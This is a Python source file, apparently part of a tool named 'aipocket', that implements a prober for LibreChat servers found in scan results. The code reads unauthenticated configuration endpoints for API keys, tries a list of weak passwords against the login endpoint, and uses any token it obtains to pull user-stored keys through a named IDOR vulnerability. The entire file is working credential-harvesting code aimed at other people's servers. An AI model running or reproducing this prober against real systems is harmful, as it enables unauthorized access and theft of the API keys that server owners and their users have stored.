"""LibreChat prober — endpoint config + user key reads.

LibreChat exposes:
  - GET /api/config → endpoint configurations (may contain API keys)
  - GET /api/endpoints → list of configured AI endpoints
  - GET /api/keys → user-stored API keys (requires auth, CVE-2026-31942 IDOR)
"""

from __future__ import annotations

import logging
from typing import Any

from aipocket.core.models import Credential
from ..base import WEAK_CREDENTIALS, Prober

log = logging.getLogger(__name__)


class LibreChatProber(Prober):
    product_name = "librechat"

    @classmethod
    def identify(cls, hit: dict[str, Any]) -> bool:
        blob = (hit.get("title", "") + hit.get("header", "") + hit.get("banner", "")).lower()
        return "librechat" in blob

    async def probe(self, hit: dict[str, Any]) -> list[Credential]:
        creds: list[Credential] = []

        # 1. Unauthenticated config reads
        for path in ("/api/config", "/api/endpoints", "/api/health"):
            resp = await self._get(self._url(hit, path))
            found = self._extract_from_response(resp, hit, f"librechat_{path.strip('/').replace('/', '_')}")
            creds.extend(found)

        # 2. Weak-password login → read /api/keys (CVE-2026-31942 IDOR)
        token = await self._try_login(hit)
        if token:
            for path in ("/api/keys", "/api/endpoints"):
                resp = await self._get(
                    self._url(hit, path),
                    headers={"Authorization": f"Bearer {token}"},
                )
                found = self._extract_from_response(resp, hit, f"librechat_authed_{path.strip('/').replace('/', '_')}")
                creds.extend(found)

        return creds

    async def _try_login(self, hit: dict[str, Any]) -> str:
        url = self._url(hit, "/api/auth/login")
        if not url:
            return ""
        for username, password in WEAK_CREDENTIALS:
            resp = await self._post(url, json={"email": username, "password": password, "username": username})
            if resp is None or resp.status_code != 200:
                continue
            try:
                data = resp.json()
            except ValueError:
                continue
            token = data.get("token") or data.get("access_token") or ""
            if token:
                return token
        return ""
